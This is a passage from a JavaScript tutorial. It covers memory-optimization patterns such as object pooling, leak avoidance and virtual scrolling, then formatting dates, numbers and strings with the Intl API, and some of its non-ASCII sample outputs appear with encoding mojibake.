      // Pool exhausted, create new
      obj = this.factory();
    }
    
    this.inUse.add(obj);
    return obj;
  }
  
  release(obj) {
    if (this.inUse.has(obj)) {
      this.inUse.delete(obj);
      
      // Reset object state
      this.resetFn(obj);
      
      this.available.push(obj);
    }
  }
  
  size() {
    return {
      available: this.available.length,
      inUse: this.inUse.size,
      total: this.available.length + this.inUse.size
    };
  }
}

// Usage: Pooling expensive objects
const particlePool = new ObjectPool(
  // Factory
  () => ({
    x: 0,
    y: 0,
    vx: 0,
    vy: 0,
    life: 0,
    active: false
  }),
  // Reset function
  (particle) => {
    particle.x = 0;
    particle.y = 0;
    particle.vx = 0;
    particle.vy = 0;
    particle.life = 0;
    particle.active = false;
  },
  100 // Initial size
);

// Game loop
function update() {
  // Acquire particle
  const particle = particlePool.acquire();
  particle.x = Math.random() * 800;
  particle.y = Math.random() * 600;
  particle.life = 100;
  particle.active = true;
  
  // Use particle...
  
  // Release when done
  if (particle.life <= 0) {
    particlePool.release(particle);
  }
}

console.log(particlePool.size());
// { available: 100, inUse: 0, total: 100 }
```

**Array Buffer Pool:**

```javascript
class ArrayBufferPool {
  constructor(bufferSize) {
    this.bufferSize = bufferSize;
    this.available = [];
    this.inUse = new WeakSet();
  }
  
  acquire() {
    if (this.available.length > 0) {
      const buffer = this.available.pop();
      this.inUse.add(buffer);
      return buffer;
    }
    
    const buffer = new ArrayBuffer(this.bufferSize);
    this.inUse.add(buffer);
    return buffer;
  }
  
  release(buffer) {
    if (this.inUse.has(buffer)) {
      this.inUse.delete(buffer);
      // Clear buffer
      new Uint8Array(buffer).fill(0);
      this.available.push(buffer);
    }
  }
  
  clear() {
    this.available = [];
    // inUse will be cleared by GC
  }
}

// Usage
const bufferPool = new ArrayBufferPool(1024 * 1024); // 1MB buffers

function processData(data) {
  const buffer = bufferPool.acquire();
  const view = new Uint8Array(buffer);
  
  // Process data into buffer
  for (let i = 0; i < data.length; i++) {
    view[i] = data[i] * 2;
  }
  
  // Use buffer...
  
  // Release back to pool
  bufferPool.release(buffer);
}
```

### Avoiding Memory Leaks

Best practices and patterns to prevent memory leaks.

**1. Proper Event Listener Management:**

```javascript
class ComponentWithListeners {
  constructor(element) {
    this.element = element;
    this.listeners = new Map();
  }
  
  addEventListener(type, handler) {
    // Store reference to handler
    if (!this.listeners.has(type)) {
      this.listeners.set(type, []);
    }
    
    this.listeners.get(type).push(handler);
    this.element.addEventListener(type, handler);
  }
  
  removeEventListener(type, handler) {
    const handlers = this.listeners.get(type);
    if (handlers) {
      const index = handlers.indexOf(handler);
      if (index > -1) {
        handlers.splice(index, 1);
        this.element.removeEventListener(type, handler);
      }
    }
  }
  
  destroy() {
    // Remove all listeners
    for (const [type, handlers] of this.listeners) {
      handlers.forEach(handler => {
        this.element.removeEventListener(type, handler);
      });
    }
    
    this.listeners.clear();
    this.element = null;
  }
}

// Usage
const button = document.createElement('button');
const component = new ComponentWithListeners(button);

component.addEventListener('click', () => console.log('Clicked'));

// When done
component.destroy(); // Prevents memory leak
```

**2. Timer Cleanup:**

```javascript
class Timer {
  constructor() {
    this.timers = new Set();
  }
  
  setTimeout(callback, delay) {
    const id = setTimeout(() => {
      callback();
      this.timers.delete(id);
    }, delay);
    
    this.timers.add(id);
    return id;
  }
  
  setInterval(callback, delay) {
    const id = setInterval(callback, delay);
    this.timers.add(id);
    return id;
  }
  
  clearTimeout(id) {
    clearTimeout(id);
    this.timers.delete(id);
  }
  
  clearInterval(id) {
    clearInterval(id);
    this.timers.delete(id);
  }
  
  clearAll() {
    for (const id of this.timers) {
      clearTimeout(id);
      clearInterval(id);
    }
    this.timers.clear();
  }
}

// Usage
const timer = new Timer();

timer.setTimeout(() => console.log('Hello'), 1000);
timer.setInterval(() => console.log('Tick'), 1000);

// When done
timer.clearAll(); // Prevents memory leak
```

**3. Avoiding Closure Leaks:**

```javascript
// BAD: Closure captures unnecessary large object
function createHandler() {
  const hugeArray = new Array(1000000).fill('data');
  const smallValue = 42;
  
  return function() {
    console.log(smallValue);
    // hugeArray is captured but not used - leak!
  };
}

// GOOD: Only capture what's needed
function createHandlerOptimized() {
  const hugeArray = new Array(1000000).fill('data');
  const smallValue = 42;
  
  // Process large data and discard
  const processedValue = hugeArray.length + smallValue;
  
  // Closure only captures processedValue
  return function() {
    console.log(processedValue);
    // hugeArray can be collected
  };
}

// BETTER: Use parameters
function createHandlerBest() {
  const hugeArray = new Array(1000000).fill('data');
  const result = processData(hugeArray);
  
  return createClosureWith(result);
}

function processData(array) {
  return array.length;
}

function createClosureWith(value) {
  return function() {
    console.log(value);
  };
}
```

### Closure Memory Implications

Understanding how closures affect memory and how to optimize them.

**Closure Scope Chain:**

```javascript
function createFunctions() {
  const shared = { count: 0 }; // Shared by all closures
  const large = new Array(100000).fill('data'); // Captured by all
  
  return {
    increment() {
      shared.count++;
      // Both 'shared' and 'large' are in scope
    },
    
    getCount() {
      return shared.count;
      // Both 'shared' and 'large' are in scope
    },
    
    // 'large' is never used but still kept in memory!
  };
}

// Memory impact:
// - 'shared' is used, needs to be kept
// - 'large' is NOT used but still kept because it's in scope

// OPTIMIZED VERSION
function createFunctionsOptimized() {
  const shared = { count: 0 };
  
  // Process large data and discard
  {
    const large = new Array(100000).fill('data');
    shared.initial = large.length;
  }
  // 'large' out of scope, can be collected
  
  return {
    increment() {
      shared.count++;
    },
    
    getCount() {
      return shared.count;
    }
  };
}
```

**Nested Closure Memory:**

```javascript
function outerFunction() {
  const outerData = new Array(50000).fill('outer');
  
  return function middleFunction() {
    const middleData = new Array(50000).fill('middle');
    
    return function innerFunction() {
      const innerData = new Array(50000).fill('inner');
      
      // This closure keeps ALL three arrays in memory
      return function() {
        console.log(
          outerData.length,
          middleData.length,
          innerData.length
        );
      };
    };
  };
}

// All three arrays are kept in memory
const fn = outerFunction()()()();

// OPTIMIZED: Only keep what's needed
function optimizedOuter() {
  const outerData = new Array(50000).fill('outer');
  const outerValue = outerData.length; // Extract value
  
  return function optimizedMiddle() {
    const middleData = new Array(50000).fill('middle');
    const middleValue = middleData.length; // Extract value
    
    return function optimizedInner() {
      const innerData = new Array(50000).fill('inner');
      const innerValue = innerData.length; // Extract value
      
      // Only keep the values, not the arrays
      return function() {
        console.log(outerValue, middleValue, innerValue);
      };
    };
  };
}

// Only three numbers kept in memory, arrays are collected
```

### Large Data Structure Strategies

Efficient handling of large data structures.

**1. Lazy Loading:**

```javascript
class LazyDataStructure {
  constructor(size) {
    this.size = size;
    this.chunks = new Map();
    this.chunkSize = 1000;
  }
  
  getChunkIndex(index) {
    return Math.floor(index / this.chunkSize);
  }
  
  loadChunk(chunkIndex) {
    if (!this.chunks.has(chunkIndex)) {
      console.log(`Loading chunk ${chunkIndex}`);
      
      const chunk = new Array(this.chunkSize);
      const startIndex = chunkIndex * this.chunkSize;
      
      for (let i = 0; i < this.chunkSize; i++) {
        chunk[i] = startIndex + i;
      }
      
      this.chunks.set(chunkIndex, chunk);
    }
    return this.chunks.get(chunkIndex);
  }
  
  get(index) {
    if (index < 0 || index >= this.size) {
      throw new RangeError('Index out of bounds');
    }
    
    const chunkIndex = this.getChunkIndex(index);
    const chunk = this.loadChunk(chunkIndex);
    const offsetInChunk = index % this.chunkSize;
    
    return chunk[offsetInChunk];
  }
  
  unloadChunk(chunkIndex) {
    this.chunks.delete(chunkIndex);
  }
  
  // LRU cache for chunks
  maintainSize(maxChunks) {
    if (this.chunks.size > maxChunks) {
      const firstKey = this.chunks.keys().next().value;
      this.chunks.delete(firstKey);
    }
  }
}

// Usage: Million element array with lazy loading
const largeArray = new LazyDataStructure(1000000);

console.log(largeArray.get(0)); // Loads chunk 0
console.log(largeArray.get(5000)); // Loads chunk 5
console.log(largeArray.get(10)); // Uses cached chunk 0
```

**2. Pagination:**

```javascript
class PaginatedData {
  constructor(fetchFn, pageSize = 100) {
    this.fetchFn = fetchFn;
    this.pageSize = pageSize;
    this.cache = new Map();
    this.cacheSize = 5; // Keep 5 pages max
  }
  
  async getPage(pageNumber) {
    if (this.cache.has(pageNumber)) {
      console.log(`Cache hit for page ${pageNumber}`);
      return this.cache.get(pageNumber);
    }
    
    console.log(`Fetching page ${pageNumber}`);
    const page = await this.fetchFn(pageNumber, this.pageSize);
    
    this.cache.set(pageNumber, page);
    this.maintainCacheSize();
    
    return page;
  }
  
  async getItem(index) {
    const pageNumber = Math.floor(index / this.pageSize);
    const page = await this.getPage(pageNumber);
    const indexInPage = index % this.pageSize;
    
    return page[indexInPage];
  }
  
  maintainCacheSize() {
    if (this.cache.size > this.cacheSize) {
      // Remove oldest entry (first key)
      const firstKey = this.cache.keys().next().value;
      this.cache.delete(firstKey);
    }
  }
  
  clearCache() {
    this.cache.clear();
  }
}

// Usage
async function fetchData(page, size) {
  // Simulate API call
  return Array.from({ length: size }, (_, i) => ({
    id: page * size + i,
    data: `Item ${page * size + i}`
  }));
}

const paginatedData = new PaginatedData(fetchData, 50);

async function demo() {
  const item = await paginatedData.getItem(175);
  console.log(item); // Fetches page 3, returns item 25 of that page
}
```

**3. Virtual Scrolling:**

```javascript
class VirtualList {
  constructor(totalItems, itemHeight, visibleCount) {
    this.totalItems = totalItems;
    this.itemHeight = itemHeight;
    this.visibleCount = visibleCount;
    this.scrollPosition = 0;
    this.renderedItems = new Map();
  }
  
  getVisibleRange() {
    const startIndex = Math.floor(this.scrollPosition / this.itemHeight);
    const endIndex = Math.min(
      startIndex + this.visibleCount,
      this.totalItems
    );
    
    return { startIndex, endIndex };
  }
  
  onScroll(scrollTop) {
    this.scrollPosition = scrollTop;
    const { startIndex, endIndex } = this.getVisibleRange();
    
    // Remove items outside visible range
    for (const [index] of this.renderedItems) {
      if (index < startIndex || index >= endIndex) {
        this.renderedItems.delete(index);
      }
    }
    
    // Add items in visible range
    for (let i = startIndex; i < endIndex; i++) {
      if (!this.renderedItems.has(i)) {
        this.renderedItems.set(i, this.createItem(i));
      }
    }
    
    return Array.from(this.renderedItems.values());
  }
  
  createItem(index) {
    return {
      index,
      top: index * this.itemHeight,
      height: this.itemHeight,
      content: `Item ${index}`
    };
  }
  
  getRenderedCount() {
    return this.renderedItems.size;
  }
}

// Usage: 100,000 items, only render ~20 at a time
const virtualList = new VirtualList(100000, 50, 20);

// Simulate scroll
let scrollTop = 0;
setInterval(() => {
  scrollTop += 100;
  const visible = virtualList.onScroll(scrollTop);
  
  console.log(
    `Rendered: ${virtualList.getRenderedCount()} / ${virtualList.totalItems}`
  );
}, 100);
```

**4. Streaming Large Data:**

```javascript
class StreamProcessor {
  constructor(chunkSize = 1000) {
    this.chunkSize = chunkSize;
  }
  
  async *processLargeData(dataSource) {
    let offset = 0;
    
    while (true) {
      // Fetch chunk
      const chunk = await dataSource.fetch(offset, this.chunkSize);
      
      if (chunk.length === 0) break;
      
      // Process chunk
      const processed = chunk.map(item => this.transform(item));
      
      // Yield processed chunk
      yield processed;
      
      offset += chunk.length;
      
      // Original chunk can now be garbage collected
    }
  }
  
  transform(item) {
    // Transform logic
    return { ...item, processed: true };
  }
  
  async consumeAll(dataSource, onChunk) {
    for await (const chunk of this.processLargeData(dataSource)) {
      onChunk(chunk);
      // Each chunk is processed and released
    }
  }
}

// Usage
const processor = new StreamProcessor(100);

const dataSource = {
  data: Array.from({ length: 10000 }, (_, i) => ({ id: i })),
  
  async fetch(offset, limit) {
    return this.data.slice(offset, offset + limit);
  }
};

processor.consumeAll(dataSource, (chunk) => {
  console.log(`Processed chunk of ${chunk.length} items`);
  // Process chunk, then it can be collected
});
```

---

## Summary

This document covered Memory Management comprehensively:

- **Garbage Collection**: Mark-and-sweep algorithm, reference counting, generational collection, common memory leak patterns, and profiling tools
- **WeakRef**: Creating weak references, using deref(), and practical use cases for caching and observers
- **FinalizationRegistry**: Registering cleanup callbacks and resource management patterns
- **Memory Optimization**: Object pooling, avoiding leaks, understanding closure memory implications, and strategies for large data structures

Understanding memory management helps build performant JavaScript applications that use memory efficiently and avoid leaks.

---

**Related Topics to Explore Next:**

- Performance profiling and optimization
- Web Workers for parallel processing
- WebAssembly for memory-intensive operations
- IndexedDB for offline storage
- Service Workers and caching strategies
---

**End of Chapter 17**


# 18-Internationalization.md

# 18 Internationalization

---

# Internationalization (Intl)


## 18.1 Intl.DateTimeFormat

The Intl.DateTimeFormat object enables language-sensitive date and time formatting.

### Locale-Aware Date Formatting

DateTimeFormat adapts date formatting to different locales and cultural conventions.

**Basic Usage:**

```javascript
const date = new Date('2024-03-15T14:30:00');

// Different locales format dates differently
console.log(new Intl.DateTimeFormat('en-US').format(date));
// "3/15/2024"

console.log(new Intl.DateTimeFormat('en-GB').format(date));
// "15/03/2024"

console.log(new Intl.DateTimeFormat('de-DE').format(date));
// "15.3.2024"

console.log(new Intl.DateTimeFormat('ja-JP').format(date));
// "2024/3/15"

console.log(new Intl.DateTimeFormat('ar-EG').format(date));
// "Ù¡Ù¥â€/Ù£â€/Ù¢Ù Ù¢Ù¤"

console.log(new Intl.DateTimeFormat('zh-CN').format(date));
// "2024/3/15"
```

**Formatting Multiple Dates:**

```javascript
const dates = [
  new Date('2024-01-01'),
  new Date('2024-06-15'),
  new Date('2024-12-31')
];

const formatter = new Intl.DateTimeFormat('en-US');

dates.forEach(date => {
  console.log(formatter.format(date));
});
// "1/1/2024"
// "6/15/2024"
// "12/31/2024"
```

**Using Default Locale:**

```javascript
const date = new Date('2024-03-15');

// Use user's default locale
const defaultFormatter = new Intl.DateTimeFormat();
console.log(defaultFormatter.format(date));

// Get the resolved locale
console.log(defaultFormatter.resolvedOptions().locale);
```

### Options (dateStyle, timeStyle, etc.)

DateTimeFormat accepts various options to customize formatting.

**dateStyle and timeStyle:**

```javascript
const date = new Date('2024-03-15T14:30:00');

// dateStyle only
console.log(new Intl.DateTimeFormat('en-US', {
  dateStyle: 'full'
}).format(date));
// "Friday, March 15, 2024"

console.log(new Intl.DateTimeFormat('en-US', {
  dateStyle: 'long'
}).format(date));
// "March 15, 2024"

console.log(new Intl.DateTimeFormat('en-US', {
  dateStyle: 'medium'
}).format(date));
// "Mar 15, 2024"

console.log(new Intl.DateTimeFormat('en-US', {
  dateStyle: 'short'
}).format(date));
// "3/15/24"

// timeStyle only
console.log(new Intl.DateTimeFormat('en-US', {
  timeStyle: 'full'
}).format(date));
// "2:30:00 PM Coordinated Universal Time"

console.log(new Intl.DateTimeFormat('en-US', {
  timeStyle: 'long'
}).format(date));
// "2:30:00 PM UTC"

console.log(new Intl.DateTimeFormat('en-US', {
  timeStyle: 'medium'
}).format(date));
// "2:30:00 PM"

console.log(new Intl.DateTimeFormat('en-US', {
  timeStyle: 'short'
}).format(date));
// "2:30 PM"

// Both dateStyle and timeStyle
console.log(new Intl.DateTimeFormat('en-US', {
  dateStyle: 'medium',
  timeStyle: 'short'
}).format(date));
// "Mar 15, 2024, 2:30 PM"
```

**Individual Component Options:**

```javascript
const date = new Date('2024-03-15T14:30:45');

// Customize individual components
const formatter = new Intl.DateTimeFormat('en-US', {
  weekday: 'long',    // "Friday"
  year: 'numeric',    // "2024"
  month: 'long',      // "March"
  day: 'numeric',     // "15"
  hour: 'numeric',    // "2"
  minute: '2-digit',  // "30"
  second: '2-digit',  // "45"
  hour12: true        // Use 12-hour format
});

console.log(formatter.format(date));
// "Friday, March 15, 2024 at 2:30:45 PM"

// 24-hour format
const formatter24 = new Intl.DateTimeFormat('en-US', {
  hour: '2-digit',
  minute: '2-digit',
  hour12: false
});

console.log(formatter24.format(date));
// "14:30"
```

**Month and Weekday Formats:**

```javascript
const date = new Date('2024-03-15');

// Different month formats
console.log(new Intl.DateTimeFormat('en-US', {
  month: 'numeric'
}).format(date));
// "3"

console.log(new Intl.DateTimeFormat('en-US', {
  month: '2-digit'
}).format(date));
// "03"

console.log(new Intl.DateTimeFormat('en-US', {
  month: 'short'
}).format(date));
// "Mar"

console.log(new Intl.DateTimeFormat('en-US', {
  month: 'long'
}).format(date));
// "March"

console.log(new Intl.DateTimeFormat('en-US', {
  month: 'narrow'
}).format(date));
// "M"

// Different weekday formats
console.log(new Intl.DateTimeFormat('en-US', {
  weekday: 'short'
}).format(date));
// "Fri"

console.log(new Intl.DateTimeFormat('en-US', {
  weekday: 'long'
}).format(date));
// "Friday"

console.log(new Intl.DateTimeFormat('en-US', {
  weekday: 'narrow'
}).format(date));
// "F"
```

**Time Zone Handling:**

```javascript
const date = new Date('2024-03-15T14:30:00Z');

// Different time zones
console.log(new Intl.DateTimeFormat('en-US', {
  timeZone: 'America/New_York',
  timeStyle: 'long',
  dateStyle: 'short'
}).format(date));
// "3/15/24, 10:30:00 AM EDT"

console.log(new Intl.DateTimeFormat('en-US', {
  timeZone: 'Europe/London',
  timeStyle: 'long',
  dateStyle: 'short'
}).format(date));
// "3/15/24, 2:30:00 PM GMT"

console.log(new Intl.DateTimeFormat('en-US', {
  timeZone: 'Asia/Tokyo',
  timeStyle: 'long',
  dateStyle: 'short'
}).format(date));
// "3/15/24, 11:30:00 PM GMT+9"

// Show time zone name
console.log(new Intl.DateTimeFormat('en-US', {
  timeZone: 'America/Los_Angeles',
  timeZoneName: 'long'
}).format(date));
// "3/15/2024, Pacific Daylight Time"

console.log(new Intl.DateTimeFormat('en-US', {
  timeZone: 'America/Los_Angeles',
  timeZoneName: 'short'
}).format(date));
// "3/15/2024, PDT"
```

**formatToParts Method:**

```javascript
const date = new Date('2024-03-15T14:30:00');

const formatter = new Intl.DateTimeFormat('en-US', {
  weekday: 'long',
  year: 'numeric',
  month: 'long',
  day: 'numeric'
});

const parts = formatter.formatToParts(date);
console.log(parts);
/*
[
  { type: 'weekday', value: 'Friday' },
  { type: 'literal', value: ', ' },
  { type: 'month', value: 'March' },
  { type: 'literal', value: ' ' },
  { type: 'day', value: '15' },
  { type: 'literal', value: ', ' },
  { type: 'year', value: '2024' }
]
*/

// Build custom format
const customFormat = parts
  .map(part => {
    if (part.type === 'weekday') return `**${part.value}**`;
    if (part.type === 'month') return part.value.toUpperCase();
    return part.value;
  })
  .join('');

console.log(customFormat);
// "**Friday**, MARCH 15, 2024"
```

**formatRange and formatRangeToParts:**

```javascript
const start = new Date('2024-03-15');
const end = new Date('2024-03-20');

const formatter = new Intl.DateTimeFormat('en-US', {
  dateStyle: 'medium'
});

// Format date range
console.log(formatter.formatRange(start, end));
// "Mar 15 â€“ 20, 2024"

// Different locales
console.log(new Intl.DateTimeFormat('de-DE', {
  dateStyle: 'medium'
}).formatRange(start, end));
// "15.â€“20. MÃ¤rz 2024"

// Format range to parts
const rangeParts = formatter.formatRangeToParts(start, end);
console.log(rangeParts);
/*
[
  { type: 'month', value: 'Mar', source: 'startRange' },
  { type: 'literal', value: ' ', source: 'startRange' },
  { type: 'day', value: '15', source: 'startRange' },
  { type: 'literal', value: ' â€“ ', source: 'shared' },
  { type: 'day', value: '20', source: 'endRange' },
  { type: 'literal', value: ', ', source: 'shared' },
  { type: 'year', value: '2024', source: 'shared' }
]
*/
```

**Practical Examples:**

```javascript
// Blog post timestamp
function formatBlogDate(date, locale = 'en-US') {
  return new Intl.DateTimeFormat(locale, {
    year: 'numeric',
    month: 'long',
    day: 'numeric',
    hour: 'numeric',
    minute: '2-digit'
  }).format(date);
}

console.log(formatBlogDate(new Date()));
// "March 15, 2024 at 2:30 PM"

// Event schedule
function formatEventTime(start, end, locale = 'en-US') {
  const dateFormatter = new Intl.DateTimeFormat(locale, {
    weekday: 'long',
    month: 'long',
    day: 'numeric'
  });
  
  const timeFormatter = new Intl.DateTimeFormat(locale, {
    hour: 'numeric',
    minute: '2-digit'
  });
  
  return `${dateFormatter.format(start)}, ${timeFormatter.format(start)} - ${timeFormatter.format(end)}`;
}

const eventStart = new Date('2024-03-15T14:00:00');
const eventEnd = new Date('2024-03-15T16:00:00');

console.log(formatEventTime(eventStart, eventEnd));
// "Friday, March 15, 2:00 PM - 4:00 PM"

// Multi-locale support
function createLocalizedFormatter(locale) {
  return {
    short: new Intl.DateTimeFormat(locale, { dateStyle: 'short' }),
    medium: new Intl.DateTimeFormat(locale, { dateStyle: 'medium' }),
    long: new Intl.DateTimeFormat(locale, { dateStyle: 'long' }),
    full: new Intl.DateTimeFormat(locale, { dateStyle: 'full' })
  };
}

const enFormatters = createLocalizedFormatter('en-US');
const date = new Date('2024-03-15');

console.log('Short:', enFormatters.short.format(date));
console.log('Medium:', enFormatters.medium.format(date));
console.log('Long:', enFormatters.long.format(date));
console.log('Full:', enFormatters.full.format(date));
```

---

## 18.2 Intl.NumberFormat

The Intl.NumberFormat object enables language-sensitive number formatting.

### Number Formatting

Basic number formatting with locale awareness.

**Basic Usage:**

```javascript
const number = 1234567.89;

// Different locales format numbers differently
console.log(new Intl.NumberFormat('en-US').format(number));
// "1,234,567.89"

console.log(new Intl.NumberFormat('de-DE').format(number));
// "1.234.567,89"

console.log(new Intl.NumberFormat('fr-FR').format(number));
// "1 234 567,89"

console.log(new Intl.NumberFormat('ar-EG').format(number));
// "Ù¡Ù¬Ù¢Ù£Ù¤Ù¬Ù¥Ù¦Ù§Ù«Ù¨Ù©"

console.log(new Intl.NumberFormat('hi-IN').format(number));
// "12,34,567.89" (Indian numbering system)
```

**Decimal Places:**

```javascript
const number = 123.456789;

// Control decimal places
console.log(new Intl.NumberFormat('en-US', {
  minimumFractionDigits: 2,
  maximumFractionDigits: 2
}).format(number));
// "123.46"

console.log(new Intl.NumberFormat('en-US', {
  minimumFractionDigits: 4,
  maximumFractionDigits: 4
}).format(number));
// "123.4568"

// Significant digits
console.log(new Intl.NumberFormat('en-US', {
  minimumSignificantDigits: 5,
  maximumSignificantDigits: 5
}).format(number));
// "123.46"

console.log(new Intl.NumberFormat('en-US', {
  minimumSignificantDigits: 2,
  maximumSignificantDigits: 2
}).format(number));
// "120"
```

### Currency Formatting

Formatting numbers as currency with proper symbols and positioning.

**Basic Currency:**

```javascript
const amount = 1234.56;

// US Dollar
console.log(new Intl.NumberFormat('en-US', {
  style: 'currency',
  currency: 'USD'
}).format(amount));
// "$1,234.56"

// Euro
console.log(new Intl.NumberFormat('de-DE', {
  style: 'currency',
  currency: 'EUR'
}).format(amount));
// "1.234,56 â‚¬"

// Japanese Yen
console.log(new Intl.NumberFormat('ja-JP', {
  style: 'currency',
  currency: 'JPY'
}).format(amount));
// "Â¥1,235" (no decimal places for JPY)

// British Pound
console.log(new Intl.NumberFormat('en-GB', {
  style: 'currency',
  currency: 'GBP'
}).format(amount));
// "Â£1,234.56"
```

**Currency Display Options:**

```javascript
const amount = 1234.56;

// Different currency display styles
console.log(new Intl.NumberFormat('en-US', {
  style: 'currency',
  currency: 'USD',
  currencyDisplay: 'symbol'
}).format(amount));
// "$1,234.56"

console.log(new Intl.NumberFormat('en-US', {
  style: 'currency',
  currency: 'USD',
  currencyDisplay: 'code'
}).format(amount));
// "USD 1,234.56"

console.log(new Intl.NumberFormat('en-US', {
  style: 'currency',
  currency: 'USD',
  currencyDisplay: 'name'
}).format(amount));
// "1,234.56 US dollars"

console.log(new Intl.NumberFormat('en-US', {
  style: 'currency',
  currency: 'USD',
  currencyDisplay: 'narrowSymbol'
}).format(amount));
// "$1,234.56"
```

**Currency Sign:**

```javascript
const amount = -1234.56;

// Different sign display options
console.log(new Intl.NumberFormat('en-US', {
  style: 'currency',
  currency: 'USD',
  currencySign: 'standard'
}).format(amount));
// "-$1,234.56"

console.log(new Intl.NumberFormat('en-US', {
  style: 'currency',
  currency: 'USD',
  currencySign: 'accounting'
}).format(amount));
// "($1,234.56)"
```

### Unit Formatting

Formatting numbers with units (length, weight, speed, etc.).

**Basic Unit Formatting:**

```javascript
const value = 50;

// Distance units
console.log(new Intl.NumberFormat('en-US', {
  style: 'unit',
  unit: 'kilometer'
}).format(value));
// "50 km"

console.log(new Intl.NumberFormat('en-US', {
  style: 'unit',
  unit: 'mile'
}).format(value));
// "50 mi"

// Speed units
console.log(new Intl.NumberFormat('en-US', {
  style: 'unit',
  unit: 'kilometer-per-hour'
}).format(value));
// "50 km/h"

console.log(new Intl.NumberFormat('en-US', {
  style: 'unit',
  unit: 'mile-per-hour'
}).format(value));
// "50 mph"

// Weight units
console.log(new Intl.NumberFormat('en-US', {
  style: 'unit',
  unit: 'kilogram'
}).format(value));
// "50 kg"

console.log(new Intl.NumberFormat('en-US', {
  style: 'unit',
  unit: 'pound'
}).format(value));
// "50 lb"
```

**Unit Display Options:**

```javascript
const value = 50;

console.log(new Intl.NumberFormat('en-US', {
  style: 'unit',
  unit: 'liter',
  unitDisplay: 'long'
}).format(value));
// "50 liters"

console.log(new Intl.NumberFormat('en-US', {
  style: 'unit',
  unit: 'liter',
  unitDisplay: 'short'
}).format(value));
// "50 L"

console.log(new Intl.NumberFormat('en-US', {
  style: 'unit',
  unit: 'liter',
  unitDisplay: 'narrow'
}).format(value));
// "50L"
```

**Complex Units:**

```javascript
// Temperature
console.log(new Intl.NumberFormat('en-US', {
  style: 'unit',
  unit: 'celsius'
}).format(25));
// "25Â°C"

console.log(new Intl.NumberFormat('en-US', {
  style: 'unit',
  unit: 'fahrenheit'
}).format(77));
// "77Â°F"

// Digital storage
console.log(new Intl.NumberFormat('en-US', {
  style: 'unit',
  unit: 'gigabyte'
}).format(256));
// "256 GB"

console.log(new Intl.NumberFormat('en-US', {
  style: 'unit',
  unit: 'megabyte'
}).format(512));
// "512 MB"

// Time
console.log(new Intl.NumberFormat('en-US', {
  style: 'unit',
  unit: 'hour'
}).format(24));
// "24 hr"

console.log(new Intl.NumberFormat('en-US', {
  style: 'unit',
  unit: 'minute'
}).format(90));
// "90 min"
```

### Compact Notation

Formatting large numbers in compact form (K, M, B, etc.).

**Compact Long:**

```javascript
console.log(new Intl.NumberFormat('en-US', {
  notation: 'compact',
  compactDisplay: 'long'
}).format(1000));
// "1 thousand"

console.log(new Intl.NumberFormat('en-US', {
  notation: 'compact',
  compactDisplay: 'long'
}).format(1500));
// "1.5 thousand"

console.log(new Intl.NumberFormat('en-US', {
  notation: 'compact',
  compactDisplay: 'long'
}).format(1000000));
// "1 million"

console.log(new Intl.NumberFormat('en-US', {
  notation: 'compact',
  compactDisplay: 'long'
}).format(1234567890));
// "1.2 billion"
```

**Compact Short:**

```javascript
console.log(new Intl.NumberFormat('en-US', {
  notation: 'compact',
  compactDisplay: 'short'
}).format(1000));
// "1K"

console.log(new Intl.NumberFormat('en-US', {
  notation: 'compact',
  compactDisplay: 'short'
}).format(1500));
// "1.5K"

console.log(new Intl.NumberFormat('en-US', {
  notation: 'compact',
  compactDisplay: 'short'
}).format(1000000));
// "1M"

console.log(new Intl.NumberFormat('en-US', {
  notation: 'compact',
  compactDisplay: 'short'
}).format(1234567890));
// "1.2B"

console.log(new Intl.NumberFormat('en-US', {
  notation: 'compact',
  compactDisplay: 'short'
}).format(1234567890123));
// "1.2T"
```

**Locale Variations:**

```javascript
const number = 1234567;

console.log(new Intl.NumberFormat('de-DE', {
  notation: 'compact',
  compactDisplay: 'long'
}).format(number));
// "1,2 Millionen"

console.log(new Intl.NumberFormat('zh-CN', {
  notation: 'compact',
  compactDisplay: 'short'
}).format(number));
// "123ä¸‡"

console.log(new Intl.NumberFormat('ja-JP', {
  notation: 'compact',
  compactDisplay: 'short'
}).format(number));
// "123ä¸‡"
```

**Scientific and Engineering Notation:**

```javascript
const number = 123456.789;

console.log(new Intl.NumberFormat('en-US', {
  notation: 'scientific'
}).format(number));
// "1.235E5"

console.log(new Intl.NumberFormat('en-US', {
  notation: 'scientific',
  minimumFractionDigits: 2,
  maximumFractionDigits: 2
}).format(number));
// "1.23E5"

console.log(new Intl.NumberFormat('en-US', {
  notation: 'engineering'
}).format(number));
// "123.457E3"
```

**Practical Examples:**

```javascript
// Social media follower count
function formatFollowers(count, locale = 'en-US') {
  return new Intl.NumberFormat(locale, {
    notation: 'compact',
    compactDisplay: 'short',
    maximumFractionDigits: 1
  }).format(count);
}

console.log(formatFollowers(1234)); // "1.2K"
console.log(formatFollowers(1234567)); // "1.2M"
console.log(formatFollowers(1234567890)); // "1.2B"

// File size formatter
function formatFileSize(bytes, locale = 'en-US') {
  const units = ['byte', 'kilobyte', 'megabyte', 'gigabyte', 'terabyte'];
  let size = bytes;
  let unitIndex = 0;
  
  while (size >= 1024 && unitIndex < units.length - 1) {
    size /= 1024;
    unitIndex++;
  }
  
  return new Intl.NumberFormat(locale, {
    style: 'unit',
    unit: units[unitIndex],
    unitDisplay: 'short',
    maximumFractionDigits: 2
  }).format(size);
}

console.log(formatFileSize(1024)); // "1 KB"
console.log(formatFileSize(1536000)); // "1.46 MB"
console.log(formatFileSize(1073741824)); // "1 GB"

// Price formatter
function formatPrice(amount, currency, locale = 'en-US') {
  return new Intl.NumberFormat(locale, {
    style: 'currency',
    currency: currency,
    minimumFractionDigits: 2,
    maximumFractionDigits: 2
  }).format(amount);
}

console.log(formatPrice(1234.56, 'USD')); // "$1,234.56"
console.log(formatPrice(1234.56, 'EUR', 'de-DE')); // "1.234,56 â‚¬"
console.log(formatPrice(1234.56, 'GBP', 'en-GB')); // "Â£1,234.56"
```

---

## 18.3 Intl.Collator

The Intl.Collator object enables language-sensitive string comparison.

### String Comparison

Comparing strings according to locale-specific rules.

**Basic Comparison:**

```javascript
const collator = new Intl.Collator('en-US');

console.log(collator.compare('apple', 'banana')); // -1 (apple < banana)
console.log(collator.compare('banana', 'apple')); // 1 (banana > apple)
console.log(collator.compare('apple', 'apple')); // 0 (equal)

// Use in sort
const fruits = ['banana', 'apple', 'cherry', 'date'];
console.log(fruits.sort(collator.compare));
// ['apple', 'banana', 'cherry', 'date']
```

**Locale-Specific Comparison:**

```javascript
const words = ['Ã¤', 'z', 'a'];

// German - Ã¤ comes after a
console.log(words.sort(new Intl.Collator('de').compare));
// ['a', 'Ã¤', 'z']

